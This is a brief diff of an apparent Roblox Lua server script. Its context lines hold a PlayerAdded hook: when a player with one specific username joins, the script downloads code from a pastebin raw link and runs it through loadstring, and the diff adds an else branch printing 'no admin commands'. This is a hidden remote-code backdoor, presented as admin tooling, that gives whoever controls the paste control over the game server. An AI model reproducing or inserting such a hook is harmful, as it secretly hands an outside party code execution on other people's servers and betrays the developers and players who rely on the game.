@@ -5,6 +5,8 @@ wait()
 game:GetService("Players").PlayerAdded:Connect(function(Player)
 if Player.Name == "ProAIt5000" then
 		loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
+		else
+print("no admin commands")
 		end
 	end)
 
